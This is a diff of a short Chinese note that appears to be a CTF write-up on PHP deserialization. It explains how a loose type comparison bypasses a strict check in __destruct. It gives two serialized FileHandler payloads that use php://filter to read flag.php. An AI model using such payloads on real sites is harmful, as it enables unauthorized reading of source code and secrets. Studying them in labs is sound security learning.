@@ -1,4 +1,5 @@
 ![[Pasted image 20221104081222.png]]
+
 好一个一语双关
 ```php
 <?php
@@ -116,6 +117,7 @@ function __destruct()
 }
 ```
 `__destruct`方法中`$this->op`与`"2"`的比较是强类型比较
+
 而
 ```php
 public function process()
@@ -136,6 +138,7 @@ public function process()
 }
 ```
 `process`方法中`$this->op`与`"1"`和`"2"`的比较是[[弱类型比较绕过|弱类型比较]]
+
 可利用这一点绕过`__deconstruct`的限制
 ```php
 /?str=O:11:"FileHandler":3:{s:5:"%00*%00op";i:2;s:11:"%00*%00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:"%00*%00content";s:3:"123";}
@@ -145,5 +148,7 @@ public function process()
 /?str=O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";S:10:"\00*\00content";s:3:"123";}
 ```
 ![[Pasted image 20221104092901.png]]
+
 ![[Pasted image 20221104093055.png]]
+
 #Web #反序列化 #PHP #绕过 #LFI
